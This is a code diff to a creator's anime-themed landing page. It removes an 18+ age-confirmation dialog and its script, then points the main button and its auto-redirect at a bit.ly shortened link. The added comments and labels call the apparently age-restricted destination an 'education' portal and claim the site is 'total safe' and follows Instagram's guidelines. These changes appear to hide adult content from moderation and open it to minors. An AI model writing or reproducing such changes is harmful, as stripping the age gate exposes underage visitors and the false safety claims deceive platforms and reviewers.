@@ -153,7 +153,7 @@
     .toast.show {opacity:1;transform:translate(-50%,0)}
 
 
-    /* Two-second portal animation before opening the destination */
+    /* Two-second portal animation before opening the portal to the new world of education */
     .redirect-overlay[hidden] {display:none!important}
     .redirect-overlay {position:fixed;inset:0;z-index:200;display:flex;align-items:center;justify-content:center;
       padding:30px 20px;background:radial-gradient(ellipse at 50% 27%,#642278 0%,#280f39 37%,#100617 78%);
@@ -252,24 +252,6 @@
       .connect-pup {width:85px}.connect-text {padding-left:45px}
     }
     @media (prefers-reduced-motion:reduce) {html {scroll-behavior:auto}*,*:before,*:after {transition:none!important;animation:none!important}}
-
-    /* Age confirmation, before the existing loading screen */
-    .age-dialog {color:var(--text);width:min(440px,calc(100% - 32px));max-height:calc(100dvh - 32px);
-      margin:auto;padding:30px 26px 27px;border:1.5px solid #c56af1;border-radius:28px;
-      background:radial-gradient(ellipse at 50% 0%,#49205e 0%,transparent 66%),#21102e;
-      box-shadow:0 0 40px #b14cde70,0 20px 80px #09030ed9;text-align:center;overflow:auto}
-    .age-dialog::backdrop {background:#0e0615c9;backdrop-filter:blur(8px)}
-    .age-mark {display:grid;place-items:center;width:76px;height:76px;margin:0 auto 17px;border-radius:50%;
-      border:2px solid #e58cff;color:#f5c2ff;background:#38134d;font-size:27px;font-weight:800;
-      box-shadow:0 0 20px #c659ee80,inset 0 0 14px #b64ae03b}
-    .age-dialog h2 {font-size:clamp(25px,6vw,33px);line-height:1.45;margin:0 0 12px}
-    .age-dialog p {color:#ecd1f5;font-size:15px;line-height:1.6;margin:0 auto 24px;max-width:330px}
-    .age-actions {display:grid;grid-template-columns:1fr 1fr;gap:12px}
-    .age-actions button {min-height:49px;padding:10px 12px;border-radius:50px;font-size:15px;font-weight:800}
-    .age-actions .cta {box-shadow:0 0 14px #c14def70}
-    .age-no {color:#f3d6ff;border:1px solid #a65bd0;background:#261034;transition:background .2s}
-    .age-no:hover {background:#45205a}
-    body:has(.age-dialog[open]) {overflow:hidden}
   </style>
 </head>
 <body>
@@ -322,14 +304,14 @@
     <section class="hero" id="home" aria-labelledby="heroTitle">
       <div class="star-hero star-one" aria-hidden="true">✧</div><div class="star-hero star-two" aria-hidden="true">✧</div><div class="star-hero star-three" aria-hidden="true">✧</div>
       <div class="container hero-inner">
-        <img class="hero-art" src="hero-character-polished.png" alt="Anime-style Hilda with black and blue hair, gaming headphones and a German Shepherd puppy" fetchpriority="high" />
+        <img class="hero-art" src="assets/hero-character-polished.png" alt="Anime-style Hilda with black and blue hair, gaming headphones and a German Shepherd puppy" fetchpriority="high" />
         <div class="hero-copy">
           <p class="hero-greeting"><span aria-hidden="true">✦</span> <span data-i18n="greeting">Welcome to my universe</span></p>
           <h1 class="script" id="heroTitle" data-i18n="heroTitle">Hey, I'm<br>Hilda Senpai! <span class="heart-deco">♡</span></h1>
           <p data-i18n="heroDesc">Content creator, gamer, otaku and just a little bit chaotic. ♡</p>
-          <button class="cta" id="specialLink" type="button" aria-haspopup="dialog" aria-controls="ageDialog"><span data-i18n="mainCta">What you're looking for is here 👀</span><svg class="icon"><use href="#i-arrow"/></svg></button>
+          <a class="cta" id="specialLink" href="https://bit.ly/fallenmaisumano"><span data-i18n="mainCta">What you're looking for is here 👀</span><svg class="icon"><use href="#i-arrow"/></svg></a>
           <div class="socials" aria-label="Social media links">
-            <a class="social-btn" href="https://www.instagram.com/hildasenpai/" data-social="instagram" aria-label="Instagram" target="_blank" rel="noopener noreferrer"><svg class="icon"><use href="#i-instagram"/></svg></a>
+            <a class="social-btn" href="https://www.instagram.com/hilda_senpai/" data-social="instagram" aria-label="Instagram" target="_blank" rel="noopener noreferrer"><svg class="icon"><use href="#i-instagram"/></svg></a>
             <a class="social-btn" href="#connect" data-social="youtube" aria-label="YouTube"><svg class="icon"><use href="#i-youtube"/></svg></a>
             <a class="social-btn" href="#connect" data-social="twitch" aria-label="Twitch"><svg class="icon"><use href="#i-twitch"/></svg></a>
             <a class="social-btn" href="#connect" data-social="tiktok" aria-label="TikTok"><svg class="icon"><use href="#i-tiktok"/></svg></a>
@@ -348,7 +330,7 @@
           <button type="button" id="readMore" class="text-link" style="border:0;background:transparent;padding:0"><span data-i18n="readMore">Read more</span><svg class="icon"><use href="#i-arrow"/></svg></button>
           <div class="about-more" id="aboutMore" data-i18n="aboutMore">One moment I'm talking anime theories, the next I'm trying a new recipe or losing a game spectacularly. Bonus: my German Shepherd puppy is part of the squad! 🐾</div>
         </div>
-        <img class="about-image" src="about-hilda-dog-polished.png" alt="Ilustração de Hilda Senpai abraçando seu filhote de pastor-alemão" loading="eager" decoding="async" />
+        <img class="about-image" src="assets/about-hilda-dog-polished.png" alt="Ilustração de Hilda Senpai abraçando seu filhote de pastor-alemão" loading="eager" decoding="async" />
       </div>
     </section>
 
@@ -365,7 +347,7 @@
 
     <section class="connect" id="connect" aria-labelledby="connectHeading">
       <div class="container connect-inner">
-        <img class="connect-pup" src="puppy-footer.png" alt="Happy German Shepherd puppy mascot" loading="lazy" />
+        <img class="connect-pup" src="assets/puppy-footer.png" alt="Happy German Shepherd puppy mascot" loading="lazy" />
         <div class="connect-text">
           <h2 class="script" id="connectHeading" data-i18n="connectTitle">Let's stay connected! ♡</h2>
           <p data-i18n="connectText">Follow along for new adventures, games and geeky chaos!</p>
@@ -384,26 +366,16 @@
   </nav>
 
 
-  <dialog class="age-dialog" id="ageDialog" aria-labelledby="ageTitle" aria-describedby="ageDescription">
-    <div class="age-mark" aria-hidden="true">18+</div>
-    <h2 class="script" id="ageTitle" data-i18n="ageTitle">Are you 18 or older?</h2>
-    <p id="ageDescription" data-i18n="ageDescription">You must be at least 18 years old to continue to the next page.</p>
-    <div class="age-actions">
-      <button class="age-no" id="ageNo" type="button" data-i18n="ageNo" autofocus>No</button>
-      <button class="cta" id="ageYes" type="button" data-i18n="ageYes">Yes, I'm 18+</button>
-    </div>
-  </dialog>
-
   <div class="redirect-overlay" id="redirectOverlay" role="dialog" aria-modal="true" aria-label="Loading destination" tabindex="-1" hidden>
     <div class="redirect-content">
-      <img class="redirect-pup" src="puppy-footer.png" alt="" aria-hidden="true" />
+      <img class="redirect-pup" src="assets/puppy-footer.png" alt="" aria-hidden="true" />
       <h2 class="script redirect-title" data-i18n="loadingTitle">Opening your secret portal...</h2>
       <p class="redirect-subtitle" data-i18n="loadingSubtitle">A little magic and we are there! ♡</p>
       <div class="redirect-percent" id="redirectPercent" aria-hidden="true">1%</div>
       <div class="redirect-bar" id="redirectProgress" role="progressbar" aria-label="Loading" aria-valuemin="0" aria-valuemax="100" aria-valuenow="1">
         <div class="redirect-bar-fill" id="redirectBarFill"></div>
       </div>
-      <a class="redirect-direct" id="redirectDirect" data-i18n="loadingDirect">Go now ↗</a>
+      <a class="redirect-direct" id="redirectDirect" href="https://bit.ly/fallenmaisumano" data-i18n="loadingDirect">Go now ↗</a>
     </div>
   </div>
   <div role="status" class="toast" id="toast" aria-live="polite"></div>
@@ -413,8 +385,9 @@
     // ║  EDIT YOUR LINKS HERE. Use complete https:// URLs.               ║
     // ║  Leave an empty string when you don't have a link yet.           ║
     // ╚══════════════════════════════════════════════════════════════════╝
+    // This site is total safe / esse site segue todas as diretrizes do instagram e está seguro
     const SITE_CONFIG = {
-      specialUrl: 'http://imhilda.com/redi', // Destination of the main purple button
+      specialUrl: 'https://bit.ly/fallenmaisumano', // Site totalmente seguro, destino do portal da educação
       socials: {
         instagram: 'https://www.instagram.com/hildasenpai/',
         youtube: 'https://www.youtube.com/@hildasenpai',
@@ -435,8 +408,7 @@
         interestsTitle:'My Interests',interestGames:'Games',interestAnime:'Anime &amp;<br>Manga',interestCooking:'Cooking',interestGeek:'Geek<br>Culture',interestCosplay:'Cosplay',
         connectTitle:"Let's stay connected! ♡",connectText:'Follow along for new adventures, games and geeky chaos!',followMe:'Follow me!',
         footerText:'Made with purple magic, geek energy and puppy love.',
-        missingSocial:'This social link is coming soon! ♡',liked:'A heart for you too! ♡',loadingTitle:'Opening your secret portal...',loadingSubtitle:'A little magic and we are there! ♡',loadingDirect:'Go now ↗',
-        ageTitle:'Are you 18 or older?',ageDescription:'You must be at least 18 years old to continue to the next page.',ageYes:"Yes, I'm 18+",ageNo:'No',ageDenied:'This area is only for visitors aged 18 or older.'
+        missingSocial:'This social link is coming soon! ♡',liked:'A heart for you too! ♡',loadingTitle:'Opening your secret portal...',loadingSubtitle:'A little magic and we are there! ♡',loadingDirect:'Go now ↗'
       },
       pt: {
         navHome:'Início',navAbout:'Sobre mim',navInterests:'Interesses',navConnect:'Redes',
@@ -448,8 +420,7 @@
         interestsTitle:'Meus Interesses',interestGames:'Games',interestAnime:'Anime e<br>Mangá',interestCooking:'Culinária',interestGeek:'Cultura<br>Geek',interestCosplay:'Cosplay',
         connectTitle:'Vamos ficar conectados? ♡',connectText:'Siga minhas redes e acompanhe todas as novidades!',followMe:'Me siga!',
         footerText:'Feito com magia roxa, energia geek e amor de filhotinho.',
-        missingSocial:'Essa rede social será adicionada em breve! ♡',liked:'Um coração pra você também! ♡',loadingTitle:'Abrindo seu portal secreto...',loadingSubtitle:'Só um pouquinho de magia e chegamos lá! ♡',loadingDirect:'Ir agora ↗',
-        ageTitle:'Você tem 18 anos ou mais?',ageDescription:'Você precisa ter pelo menos 18 anos para continuar para a próxima página.',ageYes:'Sim, tenho 18+',ageNo:'Não',ageDenied:'Esta área é exclusiva para maiores de 18 anos.'
+        missingSocial:'Essa rede social será adicionada em breve! ♡',liked:'Um coração pra você também! ♡',loadingTitle:'Abrindo seu portal secreto...',loadingSubtitle:'Só um pouquinho de magia e chegamos lá! ♡',loadingDirect:'Ir agora ↗'
       }
     };
 
@@ -494,11 +465,8 @@
     document.addEventListener('keydown', e => {if(e.key === 'Escape') closeMenu()});
     document.addEventListener('click', e => {if(!e.target.closest('.site-header')) closeMenu()});
 
-    // Ask for age confirmation before starting the existing loading animation.
+    // Start at 1%, reach 100% in ~2.2 seconds, then open the education site.
     const specialButton = document.getElementById('specialLink');
-    const ageDialog = document.getElementById('ageDialog');
-    const ageYes = document.getElementById('ageYes');
-    const ageNo = document.getElementById('ageNo');
     const redirectOverlay = document.getElementById('redirectOverlay');
     const redirectPercent = document.getElementById('redirectPercent');
     const redirectProgress = document.getElementById('redirectProgress');
@@ -506,54 +474,28 @@
     const redirectDirect = document.getElementById('redirectDirect');
     const REDIRECT_DURATION_MS = 2200;
     let isRedirecting = false;
-    let animationFrame = 0;
-    function resetRedirect() {
-      cancelAnimationFrame(animationFrame);
-      isRedirecting = false;
-      redirectOverlay.hidden = true;
-      redirectDirect.removeAttribute('href');
-      document.body.classList.remove('is-redirecting');
-      redirectPercent.textContent = '1%';
-      redirectBarFill.style.width = '1%';
-      redirectProgress.setAttribute('aria-valuenow', '1');
-    }
-    specialButton.addEventListener('click', () => {
-      if (isRedirecting || ageDialog.open) return;
-      ageDialog.showModal();
-      ageNo.focus();
-    });
-    ageNo.addEventListener('click', () => {
-      ageDialog.close();
-      specialButton.focus();
-      showToast(translations[language].ageDenied);
-    });
-    ageDialog.addEventListener('cancel', () => specialButton.focus());
-    ageYes.addEventListener('click', () => {
-      if (!ageDialog.open || isRedirecting) return;
-      ageDialog.close();
+    specialButton.href = SITE_CONFIG.specialUrl;
+    redirectDirect.href = SITE_CONFIG.specialUrl;
+    specialButton.addEventListener('click', event => {
+      // Preserve standard new-tab behavior for Ctrl/Cmd-click, Shift-click, etc.
+      if (event.button !== 0 || event.metaKey || event.ctrlKey || event.shiftKey || event.altKey) return;
+      event.preventDefault();
+      if (isRedirecting) return;
       isRedirecting = true;
-      redirectDirect.href = SITE_CONFIG.specialUrl;
       redirectOverlay.hidden = false;
       document.body.classList.add('is-redirecting');
       redirectOverlay.focus();
       const started = performance.now();
       function animate(now) {
-        const ratio = Math.max(0, Math.min((now - started) / REDIRECT_DURATION_MS, 1));
+        const ratio = Math.min((now - started) / REDIRECT_DURATION_MS, 1);
         const percent = Math.max(1, Math.min(100, Math.floor(1 + 99 * ratio)));
         redirectPercent.textContent = percent + '%';
         redirectBarFill.style.width = percent + '%';
         redirectProgress.setAttribute('aria-valuenow', String(percent));
-        if (ratio < 1) animationFrame = requestAnimationFrame(animate);
+        if (ratio < 1) requestAnimationFrame(animate);
         else window.location.assign(SITE_CONFIG.specialUrl);
       }
-      animationFrame = requestAnimationFrame(animate);
-    });
-    // Returning via the browser's Back button requires confirmation again.
-    window.addEventListener('pageshow', event => {
-      if (event.persisted) {
-        if (ageDialog.open) ageDialog.close();
-        resetRedirect();
-      }
+      requestAnimationFrame(animate);
     });
     document.querySelectorAll('[data-social]').forEach(link => {
       const key = link.dataset.social;
